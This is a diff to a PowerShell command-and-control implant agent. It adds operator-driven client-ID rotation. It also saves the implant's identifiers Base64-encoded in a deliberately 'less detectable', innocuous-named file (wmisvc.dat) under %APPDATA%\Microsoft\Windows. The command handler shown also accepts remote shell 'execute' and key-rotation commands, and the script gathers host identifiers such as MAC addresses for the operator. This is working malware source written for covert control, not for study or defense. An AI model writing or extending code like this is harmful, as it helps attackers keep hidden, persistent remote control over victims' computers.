@@ -215,6 +215,11 @@ function Get-SystemIdentification {
         Write-Host "Generated new stable client ID: $global:clientId"
     }
     
+    # Add original client ID if we've done a rotation
+    if ($global:originalClientId -and $global:originalClientId -ne $global:clientId) {
+        $systemInfo.OriginalClientId = $global:originalClientId
+    }
+    
     # Add hardware identifiers to help server correlate clients
     $systemInfo.MacAddress = try {
         (Get-WmiObject Win32_NetworkAdapterConfiguration | 
@@ -233,12 +238,65 @@ function Get-SystemIdentification {
         $systemInfo.RotationId = $global:currentRotationId
     }
 
-    # Add this inside Get-SystemIdentification before returning the JSON
+    # Debug info
     Write-Host "DEBUG: System info client ID: $($systemInfo.ClientId)"
+    if ($systemInfo.OriginalClientId) {
+        Write-Host "DEBUG: System info original client ID: $($systemInfo.OriginalClientId)"
+    }
     
     # Convert to JSON
     $jsonInfo = ConvertTo-Json -InputObject $systemInfo -Compress
     return $jsonInfo
+}
+
+# Function to handle client ID rotation
+function Update-ClientId {
+    param([string]$NewClientId)
+    
+    try {
+        # Store the original client ID if we haven't already
+        if (-not $global:originalClientId) {
+            $global:originalClientId = $global:clientId
+        }
+        
+        # Update the global client ID variable
+        $global:clientId = $NewClientId
+        
+        # Try to save to disk, but don't fail if it's not possible
+        try {
+            # Create a storage location that's less detectable
+            $storageDir = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows")
+            if (Test-Path $storageDir) {
+                $storageFile = Join-Path $storageDir "wmisvc.dat"
+                
+                # Create a structure to store both IDs
+                $idInfo = @{
+                    "CurrentId" = $NewClientId
+                    "OriginalId" = $global:originalClientId
+                }
+                
+                # Convert to JSON and encode
+                $jsonInfo = ConvertTo-Json -InputObject $idInfo -Compress
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonInfo)
+                $encodedInfo = [Convert]::ToBase64String($bytes)
+                
+                # Save to file
+                [System.IO.File]::WriteAllText($storageFile, $encodedInfo)
+                Write-Host "Client ID info saved to persistent storage"
+            }
+        }
+        catch {
+            Write-Host "Note: Unable to save client ID to persistent storage: $_"
+            # Continue execution - in-memory change is still applied
+        }
+        
+        Write-Host "Client ID updated to: $NewClientId (original: $global:originalClientId)"
+        return $true
+    }
+    catch {
+        Write-Host "Error updating client ID: $_"
+        return $false
+    }
 }
 
 # Function to process commands from the C2 server
@@ -326,6 +384,17 @@ function Process-Commands {
                 # Handle key rotation command from operator
                 $success = Update-EncryptionKey -Base64Key $args
                 $result = if ($success) { "Key rotation successful - using new encryption key" } else { "Key rotation failed" }
+            }
+            elseif ($commandType -eq "client_id_rotation") {
+                # Handle client ID rotation command
+                $newClientId = $args
+                $success = Update-ClientId -NewClientId $newClientId
+                $result = if ($success) { 
+                    "Client ID rotation successful - now using $newClientId (original: $global:originalClientId)" 
+                } else { 
+                    "Client ID rotation failed" 
+                }
+                Write-Host $result
             }
             elseif ($commandType -eq "execute") {
                 # Execute shell command
@@ -487,7 +556,10 @@ function Process-ServerResponse {
 
 # Create a persistent storage for client ID - modified to be more resilient
 function Save-ClientId {
-    param([string]$ClientId)
+    param(
+        [string]$ClientId,
+        [string]$OriginalClientId
+    )
     
     if (-not $ClientId) {
         return
@@ -503,14 +575,21 @@ function Save-ClientId {
         # Store the client ID in an innocuous-looking file
         $storageFile = Join-Path $storageDir "wmisvc.dat"
         
-        # Encrypt the client ID with simple obfuscation
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($ClientId)
-        $encodedId = [Convert]::ToBase64String($bytes)
+        # Create a structure to store both IDs
+        $idInfo = @{
+            "CurrentId" = $ClientId
+            "OriginalId" = $OriginalClientId
+        }
+        
+        # Convert to JSON and encode
+        $jsonInfo = ConvertTo-Json -InputObject $idInfo -Compress
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($jsonInfo)
+        $encodedInfo = [Convert]::ToBase64String($bytes)
         
         # Save to file
-        [System.IO.File]::WriteAllText($storageFile, $encodedId)
+        [System.IO.File]::WriteAllText($storageFile, $encodedInfo)
         
-        Write-Host "Client ID saved to persistent storage"
+        Write-Host "Client ID info saved to persistent storage"
     }
     catch {
         Write-Host "Warning: Unable to save client ID to persistent storage: $_"
@@ -518,15 +597,39 @@ function Save-ClientId {
     }
 }
 
+
 # Loads the client ID from persistent storage
 function Load-ClientId {
     try {
         $storageFile = [System.Environment]::ExpandEnvironmentVariables("%APPDATA%\Microsoft\Windows\wmisvc.dat")
         if (Test-Path $storageFile) {
-            $encodedId = [System.IO.File]::ReadAllText($storageFile)
-            $bytes = [Convert]::FromBase64String($encodedId)
-            $clientId = [System.Text.Encoding]::UTF8.GetString($bytes)
-            return $clientId
+            $encodedInfo = [System.IO.File]::ReadAllText($storageFile)
+            $bytes = [Convert]::FromBase64String($encodedInfo)
+            $jsonInfo = [System.Text.Encoding]::UTF8.GetString($bytes)
+            
+            try {
+                # Try to parse as JSON (new format)
+                $idInfo = ConvertFrom-Json -InputObject $jsonInfo
+                
+                # Set global variables for both current and original IDs
+                $global:clientId = $idInfo.CurrentId
+                $global:originalClientId = $idInfo.OriginalId
+                
+                Write-Host "Loaded client ID from persistent storage: $global:clientId"
+                if ($global:originalClientId) {
+                    Write-Host "Loaded original client ID: $global:originalClientId"
+                }
+                
+                return $global:clientId
+            }
+            catch {
+                # Try old format (just a plain string)
+                $clientId = [System.Text.Encoding]::UTF8.GetString($bytes)
+                $global:clientId = $clientId
+                $global:originalClientId = $clientId  # Same as current in old format
+                Write-Host "Loaded client ID (old format) from persistent storage: $clientId"
+                return $clientId
+            }
         }
     }
     catch {
@@ -534,7 +637,10 @@ function Load-ClientId {
     }
     
     # If we can't load from storage, generate a new stable ID
-    return Get-StableClientId
+    $stableId = Get-StableClientId
+    $global:clientId = $stableId
+    $global:originalClientId = $stableId  # Initialize original to be the same as current
+    return $stableId
 }
 
 # Main agent loop
